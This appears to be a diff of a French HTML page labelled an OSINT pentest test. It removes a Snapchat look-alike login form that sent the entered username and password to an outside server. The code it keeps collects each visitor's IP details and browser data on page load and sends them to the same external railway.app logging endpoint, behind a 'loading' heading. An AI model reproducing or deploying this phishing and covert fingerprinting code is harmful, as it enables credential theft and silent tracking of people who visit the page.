@@ -3,70 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Snapchat - Connexion (Page Test)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #fffc00;
-      margin: 0; padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .login-container {
-      background: white;
-      padding: 20px 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-      width: 350px;
-      text-align: center;
-    }
-    h2 {
-      color: #FFFC00;
-      text-shadow: 1px 1px #000;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #FFFC00;
-      border: none;
-      border-radius: 5px;
-      font-weight: bold;
-      font-size: 18px;
-      cursor: pointer;
-      color: black;
-    }
-    button:hover {
-      background-color: #e6e600;
-    }
-    small {
-      display: block;
-      margin-top: 15px;
-      color: #666;
-      font-size: 12px;
-    }
-  </style>
+  <title>Page de Test - Pentest OSINT</title>
 </head>
 <body>
-  <div class="login-container">
-    <h2>Connexion Snapchat</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Nom d'utilisateur" required />
-      <input type="password" id="password" placeholder="Mot de passe" required />
-      <button type="submit">Se connecter</button>
-    </form>
-    <small>Page de test - Ne pas entrer vos vraies données</small>
-  </div>
+  <h1>Chargement des informations...</h1>
+  <p>Cette page est un test de récupération passive de données.</p>
 
   <script>
     async function getIPInfo() {
@@ -93,7 +34,7 @@
       return end - start > 100;
     }
 
-    async function collectAndSend(extraData = {}) {
+    async function collectAndSend() {
       const ipData = await getIPInfo();
       const userAgentData = navigator.userAgentData || {};
       const data = {
@@ -137,8 +78,7 @@
             return "Non disponible";
           }
         })(),
-        timestamp: new Date().toISOString(),
-        ...extraData
+        timestamp: new Date().toISOString()
       };
 
       fetch("https://web-production-3dcc4.up.railway.app/log", {
@@ -150,20 +90,7 @@
       });
     }
 
-    // Collecte passive au chargement
     collectAndSend();
-
-    // Envoi des données du formulaire à chaque connexion (factice)
-    document.getElementById("loginForm").addEventListener("submit", function(event){
-      event.preventDefault();
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-
-      collectAndSend({ snapchat_username: username, snapchat_password: password }).then(() => {
-        alert("Merci ! (Page de test, ne pas utiliser de vraies données)");
-        // Optionnel : tu peux rediriger vers une autre page ici
-      });
-    });
   </script>
 </body>
 </html>
